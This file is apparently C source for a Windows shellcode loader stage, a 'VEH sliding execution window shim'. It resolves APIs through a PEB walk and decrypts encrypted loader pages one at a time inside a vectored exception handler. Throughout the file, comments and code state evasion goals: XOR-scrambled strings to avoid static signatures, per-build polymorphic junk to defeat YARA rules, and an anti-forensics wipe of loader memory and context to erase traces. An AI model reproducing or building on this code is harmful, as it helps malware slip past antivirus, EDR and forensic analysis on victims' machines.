/**
 * VEH Sliding Execution Window Shim
 *
 * Sits between the XOR decoder and the loader in the PIC blob.
 * After decoding, execution falls here (offset 0 = VehShimEntry).
 *
 * The shim:
 *   1. Resolves VirtualProtect + Add/RemoveVectoredExceptionHandler via PEB
 *   2. Loader pages arrive per-page encrypted (only the shim was XOR-decoded)
 *   3. Installs VEH that decrypts/re-encrypts a 1-page RX window on demand
 *   4. Calls loader (first instruction faults, VEH decrypts page 0)
 *   5. On return, wipes loader pages and removes VEH
 *
 * The shim region stays RWX so the VEH handler always executes.
 * Strings are stack-built to avoid static signatures in decoded shim.
 *
 * VEH context struct is placed in .text via section attribute so
 * exe2h extraction captures it.
 */

#include <stdint.h>
#include <windows.h>
#include "peb.h"

#define RVA2VA(type, base, rva) (type)((ULONG_PTR)(base) + (rva))

/* Pull in the per-build polymorphism salt. SHIM_POLY_SALT is a 32-bit
   per-build random value; different bits gate different optional code
   blocks below. The blocks are no-ops at runtime (volatile reads/writes
   the compiler must materialize but whose results are discarded), but
   each #if branch emits different instruction sequences of different
   total length - defeating wildcard-positioned YARA rules. */
#if defined(__has_include)
#  if __has_include("poly_seed.h")
#    include "poly_seed.h"
#  endif
#endif
#ifndef SHIM_POLY_SALT
#  define SHIM_POLY_SALT 0u
#endif
#ifndef SHIM_STRING_XOR
#  define SHIM_STRING_XOR 0xA5u
#endif
#ifndef SHIM_PEB_PICK
#  define SHIM_PEB_PICK 0u
#endif
#ifndef SHIM_WIPE_BYTE
#  define SHIM_WIPE_BYTE 0x00u
#endif

/* Scrub-value derivations from SHIM_WIPE_BYTE - wipe-byte replicated to
   fill each width. Used for g_ctx field scrubbing; pointer fields are
   cast from the 64-bit form. With SHIM_WIPE_BYTE=0 these become 0 and
   match the original zero-scrub behavior. */
#define SHIM_SCRUB_U32 ((uint32_t)((uint32_t)SHIM_WIPE_BYTE * 0x01010101u))
#define SHIM_SCRUB_U64 ((uint64_t)((uint64_t)SHIM_WIPE_BYTE * 0x0101010101010101ULL))
#define SHIM_SCRUB_PTR ((void *)(uintptr_t)SHIM_SCRUB_U64)

/* Stack-built API strings are XOR-scrambled with SHIM_STRING_XOR per build
   so literal "kernel32.dll" / "VirtualProtect" / "Rtl*VectoredException*"
   never materialize on the stack or in the shim's compiled .text. The null
   terminator is intentionally NOT XORed so string traversal still terminates.
   shim_strcmp / shim_stricmp XOR the scrambled side back during compare. */
#define SX(c) ((char)((unsigned char)(c) ^ SHIM_STRING_XOR))

/* IN_TEXT_Z places module-level data inside .text so exe2h's section
   extraction captures it. MSVC routes via a `.veh$z` section that the
   linker merges into .text (a direct `.text$z` placement produces a
   second initialized-data .text section that exe2h drops). gcc puts
   it directly in .text via the section attribute. */
#ifdef _MSC_VER
#  pragma section(".veh$z", read, execute)
#  pragma comment(linker, "/MERGE:.veh=.text")
#  define IN_TEXT_Z __declspec(allocate(".veh$z"))
#else
#  define IN_TEXT_Z __attribute__((section(".text"), used))
#endif

/* XOR-scrambled API names. Forward-declared here, defined at the
   bottom of the file so VehShimEntry stays at .text+0 under gcc's
   -fno-toplevel-reorder (where declaration order is preserved). */
extern char k_addveh_xor[];
extern char k_remveh_xor[];

/* Shared VEH context. Single-slot sliding window - 4 KiB plaintext
   exposure at any moment. Source-level invariant: no backward-branch
   loop body straddles a 4 KiB boundary; enforced by per-function PE
   sections (see include/poly_section.h) under MSVC. */
typedef struct {
    void     *loader_base;
    void     *pfnVirtualProtect;
    void     *last_rx_page;
    uint32_t  loader_size;
    uint32_t  page_encrypted;
    uint64_t  page_master_key;
} VEH_CTX;

extern volatile VEH_CTX g_ctx;

/* Sentinel values - generator patches these in the blob */
#define SENTINEL_LOADER_OFFSET  0xDEAD0001
#define SENTINEL_LOADER_SIZE    0xDEAD0002
#define SENTINEL_VEH_MODE       0xDEAD0003
#define SENTINEL_PAGE_KEY_HI    0xDEAD0004
#define SENTINEL_PAGE_KEY_LO    0xDEAD0005

/* API type aliases */
typedef BOOL  (WINAPI *VP_fn)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef PVOID (WINAPI *AddVEH_fn)(ULONG, PVECTORED_EXCEPTION_HANDLER);
typedef ULONG (WINAPI *RemVEH_fn)(PVOID);
typedef void* (*LoaderEntry_fn)(void*);

/* Forward declarations of helpers */
static LONG CALLBACK SlidingVehHandler(PEXCEPTION_POINTERS ep);
static void  xor_page(void *page_addr, uint64_t master_key, uint32_t page_index);
static void  *shim_find_dll(char *dll_name);
static void  *shim_get_export(void *base, char *api_name);
static int    shim_stricmp(const char *a, const char *b);
static int    shim_strcmp(const char *a, const char *b);


/* VehShimEntry - MUST be at .text+0. Entered via fallthrough from the
   XOR decoder. RCX = instance, RDX = shim base. Pinned to .text$a
   under MSVC so /Gy COMDAT merging doesn't reorder it. */
#ifdef _MSC_VER
__declspec(code_seg(".text$a"))
#endif
void VehShimEntry(void *inst, void *shim_base) {
    volatile uint32_t ldr_off  = SENTINEL_LOADER_OFFSET;
    volatile uint32_t ldr_sz   = SENTINEL_LOADER_SIZE;
    volatile uint32_t veh_mode = SENTINEL_VEH_MODE;
    volatile uint32_t pk_hi    = SENTINEL_PAGE_KEY_HI;
    volatile uint32_t pk_lo    = SENTINEL_PAGE_KEY_LO;

    /* Salt site 1 - XOR-cancel into ldr_off (gated on bit 0).
       ldr_off is already volatile so the RMW pair cannot be folded;
       the salt constant materializes as an immediate operand woven
       into real load/store sequences against a real variable, not as
       a recognizable dead-code block. */
    #if (SHIM_POLY_SALT & 0x00000001u)
    { uint32_t _s1 = ((uint32_t)SHIM_POLY_SALT >> 1) ^ 0xA5A50000u;
      ldr_off ^= _s1; ldr_off ^= _s1; }
    #endif

    /* Salt site 2 - XOR-cancel (or ADD/SUB-cancel) into ldr_sz,
       gated on bit 4. Nested bit 5 picks 32-bit XOR vs 16-bit
       ADD/SUB body - different operand width, different opcodes. */
    #if (SHIM_POLY_SALT & 0x00000010u)
      #if (SHIM_POLY_SALT & 0x00000020u)
      { uint32_t _s2 = ((uint32_t)SHIM_POLY_SALT << 7) ^ 0xDEADBEEFu;
        ldr_sz ^= _s2; ldr_sz ^= _s2; }
      #else
      { uint16_t _s2 = (uint16_t)((SHIM_POLY_SALT >> 11) + 0xCAFEu);
        ldr_sz += _s2; ldr_sz -= _s2; }
      #endif
    #endif

    /* Stack-built strings - XOR-scrambled per build via SX(). Comparison
       routines XOR the scrambled side back during compare. */
    char s_k32[] = {SX('k'),SX('e'),SX('r'),SX('n'),SX('e'),SX('l'),
                    SX('3'),SX('2'),SX('.'),SX('d'),SX('l'),SX('l'),0};
    char s_vp[]  = {SX('V'),SX('i'),SX('r'),SX('t'),SX('u'),SX('a'),SX('l'),
                    SX('P'),SX('r'),SX('o'),SX('t'),SX('e'),SX('c'),SX('t'),0};

    /* shim_base passed via RDX by the decoder's lea rdx,[rip] trampoline */
    void *loader_base = (char*)shim_base + ldr_off;

    /* VirtualProtect from kernel32 (not forwarded) */
    void *k32 = shim_find_dll(s_k32);
    if (!k32) return;
    VP_fn pVP = (VP_fn)shim_get_export(k32, s_vp);
    if (!pVP) return;

    ULONG_PTR first_page  = (ULONG_PTR)loader_base & ~(ULONG_PTR)0xFFF;
    ULONG_PTR last_page   = ((ULONG_PTR)loader_base + ldr_sz - 1) & ~(ULONG_PTR)0xFFF;
    volatile SIZE_T protect_len = last_page - first_page + 0x1000;
    DWORD     old;

    LoaderEntry_fn loader_entry = (LoaderEntry_fn)loader_base;

    if (veh_mode == 0) {
        /* Simple 2-stage: RW->RX on entire loader, then call */
        pVP((void*)first_page, protect_len, PAGE_EXECUTE_READ, &old);
        loader_entry(inst);
    } else {
        /* VEH sliding window with per-page encryption */
        char s_ntdll[]  = {SX('n'),SX('t'),SX('d'),SX('l'),SX('l'),SX('.'),
                           SX('d'),SX('l'),SX('l'),0};

        void *ntdll = shim_find_dll(s_ntdll);
        if (!ntdll) return;

        AddVEH_fn pAddVEH = (AddVEH_fn)shim_get_export(ntdll, (char*)k_addveh_xor);
        RemVEH_fn pRemVEH = (RemVEH_fn)shim_get_export(ntdll, (char*)k_remveh_xor);
        if (!pAddVEH || !pRemVEH) return;

        volatile uint64_t page_key = ((uint64_t)pk_hi << 32) | (uint64_t)pk_lo;

        /* Salt site 3 - XOR-cancel into page_key, gated on bit 8.
           page_key is volatile so the cancel pair is preserved.
           Salt is mixed via mul + xor for a wider emitted operand
           (REX.W + 64-bit immediate path). */
        #if (SHIM_POLY_SALT & 0x00000100u)
        { uint64_t _s3 = ((uint64_t)SHIM_POLY_SALT << 13) ^ 0xC0FFEEBABEDEADAULL;
          _s3 *= 0x9E3779B97F4A7C15ULL;   /* fractional bits of phi */
          page_key ^= _s3; page_key ^= _s3; }
        #endif

        g_ctx.loader_base       = loader_base;
        g_ctx.loader_size       = ldr_sz;
        g_ctx.pfnVirtualProtect = (void*)pVP;
        g_ctx.last_rx_page      = 0;
        g_ctx.page_master_key   = page_key;
        g_ctx.page_encrypted    = 1;

        /* Loader pages are already per-page encrypted and RW
           (only the shim was decoded by the outer XOR). Ensure RW. */
        pVP((void*)first_page, protect_len, PAGE_READWRITE, &old);

        PVOID veh_handle = pAddVEH(1, SlidingVehHandler);
        if (!veh_handle) return;

        /* First instruction of loader faults - VEH decrypts page 0 */
        loader_entry(inst);

        if (veh_handle) pRemVEH(veh_handle);

        /* Salt site 4 - XOR/ADD-cancel into protect_len, gated on bit 12.
           Nested bits 13-14 pick three body shapes of different operand
           widths (32-bit XOR / 64-bit ADD-SUB / 8-bit XOR) - same null
           net effect, different emitted opcodes. protect_len is volatile
           so the cancel pair survives -Os. */
        #if (SHIM_POLY_SALT & 0x00001000u)
          #if (SHIM_POLY_SALT & 0x00002000u)
            { uint32_t _s4 = SHIM_POLY_SALT ^ 0x13371337u;
              _s4 = (_s4 + 0x9E3779B9u) ^ (_s4 << 5);
              protect_len ^= (SIZE_T)_s4; protect_len ^= (SIZE_T)_s4; }
          #elif (SHIM_POLY_SALT & 0x00004000u)
            { uint64_t _s4 = ((uint64_t)SHIM_POLY_SALT * 0xFFFFFFFFu) + 0xBADCAFEu;
              protect_len += (SIZE_T)_s4; protect_len -= (SIZE_T)_s4; }
          #else
            { uint8_t _s4 = (uint8_t)((SHIM_POLY_SALT >> 19) ^ 0x5A);
              protect_len ^= (SIZE_T)_s4; protect_len ^= (SIZE_T)_s4; }
          #endif
        #endif

        /* Wipe all loader pages - anti-forensics. Per-build wipe byte
           (SHIM_WIPE_BYTE from gen_poly) defeats the "freshly-zeroed
           multi-page RWX region near the still-mapped shim" forensic
           anchor. Data is destroyed regardless of byte value. */
        pVP((void*)first_page, protect_len, PAGE_READWRITE, &old);
        {
            uint8_t *w = (uint8_t *)first_page;
            for (SIZE_T z = 0; z < protect_len; z++) w[z] = SHIM_WIPE_BYTE;
        }

        /* Scrub VEH context - Q3+Q4: per-build pattern (SHIM_WIPE_BYTE
           replicated per field width) breaks the "all-zero VEH_CTX"
           forensic fingerprint, AND the 6 scrub stores are emitted in
           one of 4 orderings picked from SHIM_POLY_SALT bits 16-17.
           g_ctx is volatile, so each store is preserved. Safe because
           g_ctx is never referenced after this block. */
        #define SCRUB_LDR_BASE() (g_ctx.loader_base       = SHIM_SCRUB_PTR)
        #define SCRUB_VP()       (g_ctx.pfnVirtualProtect = SHIM_SCRUB_PTR)
        #define SCRUB_RX_PAGE()  (g_ctx.last_rx_page      = SHIM_SCRUB_PTR)
        #define SCRUB_LDR_SIZE() (g_ctx.loader_size       = SHIM_SCRUB_U32)
        #define SCRUB_PG_ENC()   (g_ctx.page_encrypted    = SHIM_SCRUB_U32)
        #define SCRUB_PG_KEY()   (g_ctx.page_master_key   = SHIM_SCRUB_U64)

        #if   ((SHIM_POLY_SALT >> 16) & 0x3u) == 0u
          /* Order 0 - original declaration sequence */
          SCRUB_LDR_BASE(); SCRUB_VP(); SCRUB_RX_PAGE();
          SCRUB_LDR_SIZE(); SCRUB_PG_ENC(); SCRUB_PG_KEY();
        #elif ((SHIM_POLY_SALT >> 16) & 0x3u) == 1u
          /* Order 1 - reverse */
          SCRUB_PG_KEY(); SCRUB_PG_ENC(); SCRUB_LDR_SIZE();
          SCRUB_RX_PAGE(); SCRUB_VP(); SCRUB_LDR_BASE();
        #elif ((SHIM_POLY_SALT >> 16) & 0x3u) == 2u
          /* Order 2 - pointers first, then numerics */
          SCRUB_LDR_BASE(); SCRUB_RX_PAGE(); SCRUB_VP();
          SCRUB_PG_KEY(); SCRUB_LDR_SIZE(); SCRUB_PG_ENC();
        #else
          /* Order 3 - numerics first, then pointers (interleaved) */
          SCRUB_PG_ENC(); SCRUB_LDR_SIZE(); SCRUB_PG_KEY();
          SCRUB_VP(); SCRUB_RX_PAGE(); SCRUB_LDR_BASE();
        #endif

        #undef SCRUB_LDR_BASE
        #undef SCRUB_VP
        #undef SCRUB_RX_PAGE
        #undef SCRUB_LDR_SIZE
        #undef SCRUB_PG_ENC
        #undef SCRUB_PG_KEY
    }
    /* Note: we can't drop X from the shim page here - the function epilogue
       (pop rbp / ret) still needs to execute on this page after we return.
       VEH is deregistered and g_ctx is scrubbed; the 4KB RWX shim page is
       the residual footprint. */
}

/* Per-page XOR: key = master_key ^ (page_index + 1) */
static void xor_page(void *page_addr, uint64_t master_key, uint32_t page_index) {
    uint64_t key = master_key ^ (uint64_t)(page_index + 1);
    uint64_t *p = (uint64_t *)page_addr;
    for (int i = 0; i < 4096 / 8; i++) {
        p[i] ^= key;
    }
}

/* Decrypts the faulting page, re-encrypts the previously-decrypted one.
   Only one loader page is cleartext at any moment. */
static LONG CALLBACK SlidingVehHandler(PEXCEPTION_POINTERS ep) {
    DWORD old;

    if (ep->ExceptionRecord->ExceptionCode != (DWORD)0xC0000005)
        return EXCEPTION_CONTINUE_SEARCH;

    if (ep->ExceptionRecord->NumberParameters < 2 ||
        ep->ExceptionRecord->ExceptionInformation[0] != 8)
        return EXCEPTION_CONTINUE_SEARCH;

    ULONG_PTR fault = ep->ExceptionRecord->ExceptionInformation[1];
    ULONG_PTR base  = (ULONG_PTR)g_ctx.loader_base;
    ULONG_PTR end   = base + g_ctx.loader_size;

    if (fault < base || fault >= end)
        return EXCEPTION_CONTINUE_SEARCH;

    ULONG_PTR base_page  = base & ~(ULONG_PTR)0xFFF;
    ULONG_PTR fault_page = fault & ~(ULONG_PTR)0xFFF;
    uint32_t  fault_idx  = (uint32_t)((fault_page - base_page) >> 12);

    /* Re-encrypt + demote the old page */
    if (g_ctx.last_rx_page != 0 && (ULONG_PTR)g_ctx.last_rx_page != fault_page) {
        uint32_t old_idx = (uint32_t)(((ULONG_PTR)g_ctx.last_rx_page - base_page) >> 12);
        ((VP_fn)g_ctx.pfnVirtualProtect)(
            g_ctx.last_rx_page, 0x1000, PAGE_READWRITE, &old);
        xor_page(g_ctx.last_rx_page, g_ctx.page_master_key, old_idx);
    }

    /* Decrypt the faulting page (already RW) */
    xor_page((void *)fault_page, g_ctx.page_master_key, fault_idx);

    /* Set RX so execution can proceed */
    ((VP_fn)g_ctx.pfnVirtualProtect)(
        (void*)fault_page, 0x1000, PAGE_EXECUTE_READ, &old);

    g_ctx.last_rx_page = (void*)fault_page;

    return EXCEPTION_CONTINUE_EXECUTION;
}

/* ================================================================
 * Minimal PEB walk + export resolver
 * ================================================================ */
static void *shim_find_dll(char *dll_name) {
    PPEB peb = GET_PEB();
    PPEB_LDR_DATA ldr = peb->Ldr;

    /* Per-build PEB list pick - mirrors loader's 1-of-2 selection.
       Both lists contain kernel32 and ntdll (the only DLLs we resolve). */
#if SHIM_PEB_PICK
    PLIST_ENTRY head  = &ldr->InInitializationOrderModuleList;
#else
    PLIST_ENTRY head  = &ldr->InMemoryOrderModuleList;
#endif
    PLIST_ENTRY entry = head->Flink;

    while (entry != head) {
#if SHIM_PEB_PICK
        PLDR_DATA_TABLE_ENTRY dte = (PLDR_DATA_TABLE_ENTRY)(
            (PBYTE)entry - (ULONG_PTR)&((PLDR_DATA_TABLE_ENTRY)0)->InInitializationOrderLinks);
#else
        PLDR_DATA_TABLE_ENTRY dte = (PLDR_DATA_TABLE_ENTRY)(
            (PBYTE)entry - (ULONG_PTR)&((PLDR_DATA_TABLE_ENTRY)0)->InMemoryOrderLinks);
#endif

        if (dte->DllBase != 0) {
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dte->DllBase;
            PIMAGE_NT_HEADERS nt  = RVA2VA(PIMAGE_NT_HEADERS, dte->DllBase, dos->e_lfanew);
            DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
            if (rva != 0) {
                PIMAGE_EXPORT_DIRECTORY exp = RVA2VA(PIMAGE_EXPORT_DIRECTORY, dte->DllBase, rva);
                char *name = RVA2VA(char*, dte->DllBase, exp->Name);
                if (shim_stricmp(name, dll_name) == 0) {
                    return dte->DllBase;
                }
            }
        }
        entry = entry->Flink;
    }
    return 0;
}

static void *shim_get_export(void *base, char *api_name) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (rva == 0) return 0;

    PIMAGE_EXPORT_DIRECTORY exp = RVA2VA(PIMAGE_EXPORT_DIRECTORY, base, rva);
    PDWORD adr = RVA2VA(PDWORD, base, exp->AddressOfFunctions);
    PDWORD sym = RVA2VA(PDWORD, base, exp->AddressOfNames);
    PWORD  ord = RVA2VA(PWORD,  base, exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = RVA2VA(char*, base, sym[i]);
        if (shim_strcmp(name, api_name) == 0) {
            return RVA2VA(void*, base, adr[ord[i]]);
        }
    }
    return 0;
}

/* Convention: a = plaintext (from PEB module name / export name table),
   b = scrambled stack-built string. XOR b's char with SHIM_STRING_XOR
   to recover its plaintext for comparison. The null terminator is NOT
   scrambled, so loop termination works naturally. */
static int shim_stricmp(const char *a, const char *b) {
    while (*a && *b) {
        char bc = (char)((unsigned char)*b ^ SHIM_STRING_XOR);
        if ((*a | 0x20) != (bc | 0x20)) return 1;
        a++; b++;
    }
    return (*a != *b) ? 1 : 0;
}

static int shim_strcmp(const char *a, const char *b) {
    while (*a && *b) {
        char bc = (char)((unsigned char)*b ^ SHIM_STRING_XOR);
        if (*a != bc) return 1;
        a++; b++;
    }
    return (*a != *b) ? 1 : 0;
}

/* Scrambled API names. Defined at file tail so they land after
   VehShimEntry in .text under both compilers. */
IN_TEXT_Z char k_addveh_xor[] = {
    SX('R'),SX('t'),SX('l'),SX('A'),SX('d'),SX('d'),
    SX('V'),SX('e'),SX('c'),SX('t'),SX('o'),SX('r'),SX('e'),SX('d'),
    SX('E'),SX('x'),SX('c'),SX('e'),SX('p'),SX('t'),SX('i'),SX('o'),SX('n'),
    SX('H'),SX('a'),SX('n'),SX('d'),SX('l'),SX('e'),SX('r'),0
};
IN_TEXT_Z char k_remveh_xor[] = {
    SX('R'),SX('t'),SX('l'),SX('R'),SX('e'),SX('m'),SX('o'),SX('v'),SX('e'),
    SX('V'),SX('e'),SX('c'),SX('t'),SX('o'),SX('r'),SX('e'),SX('d'),
    SX('E'),SX('x'),SX('c'),SX('e'),SX('p'),SX('t'),SX('i'),SX('o'),SX('n'),
    SX('H'),SX('a'),SX('n'),SX('d'),SX('l'),SX('e'),SX('r'),0
};

#ifdef _MSC_VER
__declspec(allocate(".veh$z"))
volatile VEH_CTX g_ctx = { 0, 0, 0, 0, 0, 0 };
#else
__attribute__((section(".text"), used))
volatile VEH_CTX g_ctx = { 0, 0, 0, 0, 0, 0 };
#endif
